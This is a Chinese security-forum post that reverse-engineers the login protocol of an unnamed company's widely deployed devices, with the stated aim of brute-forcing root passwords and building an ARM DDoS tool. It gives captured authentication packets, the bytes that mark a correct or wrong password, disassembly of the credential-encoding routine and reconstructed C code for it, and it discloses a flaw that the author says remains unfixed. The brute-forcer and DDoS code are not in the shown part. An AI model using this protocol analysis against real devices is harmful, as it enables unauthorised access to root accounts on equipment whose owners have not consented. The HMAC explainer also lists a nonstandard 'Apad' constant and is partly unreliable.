@@ -1,0 +1,240 @@
+
+# [原创]逆向HMAC认证协议写爆破程序+写ARM DDOS+[求职]
+
+---
+
+本人小菜一枚，若有错误请大神们指正。
+
+这是一个某上市公司XXX的登陆密码验证的程序，其设备覆盖全球，分析协议后可对其爆破密码....爆破`root`密码后可以...各种。。如果您已经知道这漏洞请希望您不要爆料..提交过2次漏洞都被无视了以后也不想再提交了。尤其是阿里某某竟然先修复了漏洞然后回复没漏洞，我都惊呆了 幸好我做了个录像作纪念，还有一个公司聊天套漏洞的。。。![](https://bbs.kanxue.com/view/img/face/33.gif)![](https://bbs.kanxue.com/view/img/face/11.gif)
+
+## 了解HMAC
+
+百度百科解释[理论这东西，我基础不好 只看理论我比较头大]：
+
+HMAC是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）,HMAC运算利用哈希算法，以一个密钥和一个消息为输入，生成一个消息摘要作为输出。
+
+### 算法表示
+
+算法公式 ： `HMAC（K，M）=H（K⊕opad∣H（K⊕ipad∣M））`
+
+- `H` 代表所采用的HASH算法（如 `SHA-256`）
+- `K` 代表认证密码
+- `Ko` 代表HASH算法的密文
+- `M` 代表一个消息输入
+- `B` 代表 `H` 中所处理的块大小，这个大小是处理块大小，而不是输出 hash 的大小
+- 如，`SHA-1` 和 `SHA-256` 的 `B = 64`
+- `SHA-384` 和 `SHA-512` 的 `B = 128`
+- `L` 表示 hash 的大小
+- `Opad` 用 `0x5c` 重复 `B` 次
+- `Ipad` 用 `0x36` 重复 `B` 次
+- `Apad` 用 `0x878FE1F3` 重复（`L/4`）次
+
+### 认证流程
+
+(1) 先由客户端向服务器发出一个验证请求。
+
+(2) 服务器接到此请求后生成一个随机数并通过网络传输给客户端（此为挑战）。
+
+(3) 客户端将收到的随机数提供给 `ePass`，由 `ePass` 使用该随机数与存储在 `ePass` 中的密钥进行HMAC-MD5运算并得到一个结果作为认证证据传给服务器（此为响应）。
+
+(4) 与此同时，服务器也使用该随机数与存储在服务器数据库中的该客户密钥进行HMAC-MD5运算，如果服务器的运算结果与客户端传回的响应结果相同，则认为客户端是一个合法用户
+
+---
+
+## 一、抓取HMAC认证协议过程的数据包
+
+```
+1.发送IP:端口 一段16进制数据  size:84 = 0x54   [小注：1]
+74 73 58 72 63 73 58 59 73 39 = username
+ 62 62 58 63 73 58 63 74 73 74 = password
+00 00 00 54 5A 00 00 00 00 00 00 00 00 01 00 00 04 00 28 C1 00 00 00 00 08 01 A8 C0 B8 70 F4 28 7B 6C 00 00 74 73 58 72 63 73 58 59 73 39 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 62 62 58 63 73 58 63 74 73 74 00 00 00 00 00 00
+
+2.若server回复以下16进制数据 表示：是HMAC认证协议  第4位==4C固定
+00 00 00 4C AF 0F 00 00 00 00 00 64 04 00 28 C1
+
+3.接收加密数据                                                  [小注：2]
+NjdlMzk1NmM0NGJhOTQzMTcwMjZhNjhiNzgzOGRmZDM=................
+4E 6A 64 6C 4D 7A 6B 31 4E 6D 4D 30 4E 47 4A 68 4F 54 51 7A 4D 54 63 77 4D 6A 5A 68 4E 6A 68 69 4E 7A 67 7A 4F 47 52 6D 5A 44 4D 3D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+4.发送[账号][密码]加密数据                                 [小注：3]
+00 00 00 54 63 00 00 00 00 00 00 00 00 01 00 00 04 00 28 C1 00 00 00 00 08 01 A8 C0 B8 70 F4 28 7B 6C 00 00 BD 01 BA 46 68 E9 C2 AE 75 5F 81 57 E5 0F C9 DC 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3D 55 46 FD B2 FE 10 A5 76 10 BD FA 4B DA 96 B1
+
+5.接收数据完成验证过程
+加粗为固定标志代码
+01 04==密码正确
+03 04==密码错误
+00 00 00 6C DA 0C 00 00 00 00 00 01 04 00 28 C1
+00 00 00 6C F0 00 00 00 00 00 00 03 04 00 28 C1
+```
+
+---
+
+## 二、分析验证程序，肢解各个加密功能模块。
+
+### 1.逆向第1个账号密码加密模块 -- [见小注：1]
+
+这个模块不是很难 直接用IDA F5功能就可以逆向出C源码但是核心算法处有问题需要手动修正几个地方
+
+```
+//------------------------------------//
+10084B60  /$  8B5424 04     mov edx,dword ptr ss:[esp+0x4]
+10084B64  |.  55            push ebp
+10084B65  |.  56            push esi
+10084B66  |.  57            push edi
+10084B67  |.  33ED          xor ebp,ebp
+10084B69  |.  33FF          xor edi,edi
+10084B6B  |.  85D2          test edx,edx
+10084B6D  |.  0F84 9E000000 je XXXXXXXX.10084C11
+10084B73  |.  8B7424 14     mov esi,dword ptr ss:[esp+0x14]
+10084B77  |.  85F6          test esi,esi
+10084B79  |.  0F84 92000000 je XXXXXXXX.10084C11
+10084B7F  |.  8B4424 18     mov eax,dword ptr ss:[esp+0x18]
+10084B83  |.  85C0          test eax,eax
+10084B85  |.  0F84 86000000 je XXXXXXXX.10084C11
+10084B8B  |.  7E 79         jle short XXXXXXXX.10084C06
+10084B8D  |.  53            push ebx
+10084B8E  |>  8A0A          /mov cl,byte ptr ds:[edx]
+10084B90  |.  80F9 0D       |cmp cl,0xD
+10084B93  |.  74 6A         |je short XXXXXXXX.10084BFF
+10084B95  |.  80F9 0A       |cmp cl,0xA
+10084B98  |.  74 65         |je short XXXXXXXX.10084BFF
+10084B9A  |.  0FBEC9        |movsx ecx,cl
+10084B9D  |.  0FBE5A 01     |movsx ebx,byte ptr ds:[edx+0x1]
+10084BA1  |.  0FBE89 9C4A0A>|movsx ecx,byte ptr ds:[ecx+0x100A4A9C]
+10084BA8  |.  C1E1 12       |shl ecx,0x12
+10084BAB  |.  42            |inc edx
+10084BAC  |.  0FBE9B 9C4A0A>|movsx ebx,byte ptr ds:[ebx+0x100A4A9C]
+10084BB3  |.  C1E3 0C       |shl ebx,0xC
+10084BB6  |.  03CB          |add ecx,ebx
+10084BB8  |.  42            |inc edx
+10084BB9  |.  8BD9          |mov ebx,ecx
+10084BBB  |.  C1FB 10       |sar ebx,0x10
+10084BBE  |.  881E          |mov byte ptr ds:[esi],bl
+10084BC0  |.  8A1A          |mov bl,byte ptr ds:[edx]
+10084BC2  |.  46            |inc esi
+10084BC3  |.  47            |inc edi
+10084BC4  |.  80FB 3D       |cmp bl,0x3D
+10084BC7  |.  74 31         |je short XXXXXXXX.10084BFA
+10084BC9  |.  0FBEDB        |movsx ebx,bl
+10084BCC  |.  0FBE9B 9C4A0A>|movsx ebx,byte ptr ds:[ebx+0x100A4A9C]
+10084BD3  |.  C1E3 06       |shl ebx,0x6
+10084BD6  |.  03CB          |add ecx,ebx
+10084BD8  |.  42            |inc edx
+10084BD9  |.  8BD9          |mov ebx,ecx
+10084BDB  |.  C1FB 08       |sar ebx,0x8
+10084BDE  |.  881E          |mov byte ptr ds:[esi],bl
+10084BE0  |.  8A1A          |mov bl,byte ptr ds:[edx]
+10084BE2  |.  46            |inc esi
+10084BE3  |.  47            |inc edi
+10084BE4  |.  80FB 3D       |cmp bl,0x3D
+10084BE7  |.  74 11         |je short XXXXXXXX.10084BFA
+10084BE9  |.  0FBEDB        |movsx ebx,bl
+10084BEC  |.  0FBE9B 9C4A0A>|movsx ebx,byte ptr ds:[ebx+0x100A4A9C]
+10084BF3  |.  03CB          |add ecx,ebx
+10084BF5  |.  42            |inc edx
+10084BF6  |.  880E          |mov byte ptr ds:[esi],cl
+10084BF8  |.  46            |inc esi
+10084BF9  |.  47            |inc edi
+10084BFA  |>  83C5 04       |add ebp,0x4
+10084BFD  |.  EB 02         |jmp short XXXXXXXX.10084C01
+10084BFF  |>  42            |inc edx
+10084C00  |.  45            |inc ebp
+10084C01  |>  3BE8          |cmp ebp,eax
+10084C03  |.^ 7C 89         \jl short XXXXXXXX.10084B8E
+10084C05  |.  5B            pop ebx
+10084C06  |>  8BC7          mov eax,edi
+10084C08  |.  C606 00       mov byte ptr ds:[esi],0x0
+10084C0B  |.  5F            pop edi
+10084C0C  |.  5E            pop esi
+10084C0D  |.  5D            pop ebp
+10084C0E  |.  C2 0C00       retn 0xC
+10084C11  |>  5F            pop edi
+10084C12  |.  5E            pop esi
+10084C13  |.  83C8 FF       or eax,-0x1
+10084C16  |.  5D            pop ebp
+10084C17  \.  C2 0C00       retn 0xC
+
+#include "stdafx.h"
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+int sub_100838E0(char* a1, char *Dest, int a3)
+{
+	int v3; // ecx@1
+	signed int v5; // eax@4
+	signed int v6; // edx@6
+	char v7; // al@7
+	char v8; // al@8
+
+	int ch;
+	v3 = 0;
+	*Dest = 0;
+	if ( !a3 )
+		return -1;
+	if ( a3 > 0 )
+	{
+		v5 = 1;
+		do
+		{
+			ch  = a1[v5-1];
+			ch = ch *v5;//v5 * (unsigned char)(a1 + v5 - 1);;
+			ch = ch ^v5;//v5 ^ v5 * (unsigned char)(a1 + v5 - 1);
+			v3 += ch;
+			++v5;
+		}
+		while ( v5 - 1 < a3 );
+	}
+	sprintf(Dest, "%u", 1751873395 * v3);
+	v6 = 0;
+	if ( (signed int)(strlen(Dest) - 1) > 0 )
+	{
+		while ( 1 )
+		{
+			v7 = Dest[v6];
+			if ( v7 < 51 )
+				break;
+			if ( v7 < 53 )
+			{
+				v8 = v7 + 47;
+				goto LABEL_15;
+			}
+			if ( v7 < 55 )
+			{
+				v8 = v7 + 62;
+				goto LABEL_15;
+			}
+			if ( v7 < 57 )
+			{
+				v8 = v7 + 33;
+				goto LABEL_15;
+			}
+LABEL_16:
+			++v6;
+			if ( v6 >= (signed int)(strlen(Dest) ) )
+				return 0;
+		}
+		v8 = v7 + 66;
+LABEL_15:
+		Dest[v6] = v8;
+		goto LABEL_16;
+	}
+	return 0;
+}
+
+int main(int argc, char* argv[])
+{
+	char abb[100] ={"0"};
+
+	sub_100838E0("admin",abb,5);
+	printf("admin¼ÓÃÜ = %s\n", abb);
+	sub_100838E0("12345",abb,5);
+	printf("12345¼ÓÃÜ = %s\n", abb);
+	return 0;
+}
+//------------------------------------//
+```
+
+运行效果：
+
+![](https://bbs.kanxue.com/upload/attach/201404/520001_y1mw21823ksaxnx.jpg)
